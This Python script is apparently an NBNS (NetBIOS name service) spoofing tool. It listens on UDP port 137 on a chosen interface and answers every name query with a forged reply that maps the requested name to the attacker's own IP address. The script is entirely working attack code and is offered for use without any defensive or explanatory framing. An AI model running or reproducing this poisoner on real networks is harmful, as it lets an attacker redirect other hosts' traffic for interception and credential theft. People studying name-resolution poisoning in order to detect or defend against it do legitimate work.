from argparse import ArgumentParser
import socketserver
from collections import OrderedDict
import netifaces as ni
import socket


def get_interface_ip(interf):
    ni.ifaddresses(interf)
    ip = ni.ifaddresses(interf)[ni.AF_INET][0]['addr']
    return ip
class Packet:
    fields = OrderedDict([
            ("Tid",           ""),
            ("Flags",       b"\x85\x00"),
            ("Question",    b"\x00\x00"),
            ("AnswerRRS",   b"\x00\x01"),
            ("AuthorityRRS",b"\x00\x00"),
            ("AdditionalRRS",b"\x00\x00"),
            ("NbtName",       ""),
            ("Type",        b"\x00\x20"),
            ("Classy",      b"\x00\x01"),
            ("TTL",         b"\x00\x00\x00\xa5"),
            ("Len",         b"\x00\x06"),
            ("Flags1",      b"\x00\x00"),
            ("IP",          b"\x00\x00\x00\x00")
    ])
    def __init__(self,ip , data):
        self.fields["Tid"] = data[0:2]
        self.fields["NbtName"] = data[12:46]
        self.fields["IP"] = socket.inet_aton(ip)
    def return_bytes(self):
        return b''.join(list(self.fields.values()))


class customHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print("receive UDP nbns packedt from ", self.client_address[0])
        data = self.request[0].strip()
        socket = self.request[1]
        if data[2:4]!=b"\x01\x10":
            return
        print(data)
        packet = Packet(ip, data)
        print(data[12:46])
        socket.sendto(packet.return_bytes(), self.client_address)

if __name__ == "__main__":
    import sys
    parser = ArgumentParser()
    parser.add_argument("-i", "--interface", help="choice a interface to bind")
    args = parser.parse_args()
    ip = ""
    if args.interface:
        print("start to use ", args.interface)
        try:
            ip = get_interface_ip(args.interface)
        except:
            print("can't use", args.interface)
            sys.exit()
    else:
        print("please assign an interface to spoof, example: --interface eth0")
        sys.exit()

    HOST = "0.0.0.0"
    PORT = 137
    server = socketserver.UDPServer((HOST, PORT), customHandler)
    print("start to listen on 137 udp")
    server.serve_forever()
